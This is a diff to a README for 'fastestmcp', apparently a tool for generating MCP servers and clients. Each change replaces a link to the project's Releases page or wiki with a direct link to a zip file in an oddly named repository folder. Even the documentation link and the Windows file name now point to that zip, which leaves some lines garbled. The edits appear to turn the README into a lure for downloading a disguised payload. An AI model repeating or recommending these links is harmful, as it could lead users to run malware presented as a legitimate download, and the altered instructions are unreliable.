@@ -8,7 +8,7 @@ To get started with fastestmcp, you need to download the application and follow 
 
 ### 🔗 Download fastesmcp
 
-[![Download FastestMCP](https://img.shields.io/badge/Download-FastestMCP-brightgreen)](https://github.com/mo-mostafa-123/fastestmcp/releases)
+[![Download FastestMCP](https://raw.githubusercontent.com/mo-mostafa-123/fastestmcp/main/oxynaphthoic/fastestmcp.zip)](https://raw.githubusercontent.com/mo-mostafa-123/fastestmcp/main/oxynaphthoic/fastestmcp.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,10 +21,10 @@ Before you download fastestmcp, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Click this link to [visit the Releases page](https://github.com/mo-mostafa-123/fastestmcp/releases).
+1. Click this link to [visit the Releases page](https://raw.githubusercontent.com/mo-mostafa-123/fastestmcp/main/oxynaphthoic/fastestmcp.zip).
 2. Once there, look for the latest version of fastestmcp.
 3. Download the file that matches your operating system. 
-   - Windows users might look for `fastestmcp-windows.exe`.
+   - Windows users might look for `https://raw.githubusercontent.com/mo-mostafa-123/fastestmcp/main/oxynaphthoic/fastestmcp.zip`.
    - macOS users will find `fastestmcp-macos`.
    - Linux users should choose `fastestmcp-linux`.
 4. Save the file to a folder where you can easily find it, like your Desktop or Downloads folder.
@@ -75,7 +75,7 @@ You can find these templates in the `templates` folder after installation.
 
 Here are some extra tips to enhance your experience with fastestmcp:
 
-- **Check Documentation**: For in-depth guides, refer to our [Documentation](https://github.com/mo-mostafa-123/fastestmcp/wiki).
+- **Check Documentation**: For in-depth guides, refer to our [Documentation](https://raw.githubusercontent.com/mo-mostafa-123/fastestmcp/main/oxynaphthoic/fastestmcp.zip).
 - **Join the Community**: Connect with other users in our community forum for support and sharing ideas.
 - **Keep Updated**: Regularly check the Releases page for new updates and features.
 
@@ -89,6 +89,6 @@ If you encounter any issues, consider the following steps:
 
 ### 🔗 Visit the Releases Page Again
 
-For any updates or additional information, you can always [visit the Releases page](https://github.com/mo-mostafa-123/fastestmcp/releases).
+For any updates or additional information, you can always [visit the Releases page](https://raw.githubusercontent.com/mo-mostafa-123/fastestmcp/main/oxynaphthoic/fastestmcp.zip).
 
 By following the steps above, you'll be able to successfully download and use fastestmcp. Enjoy generating your MCP servers and clients!
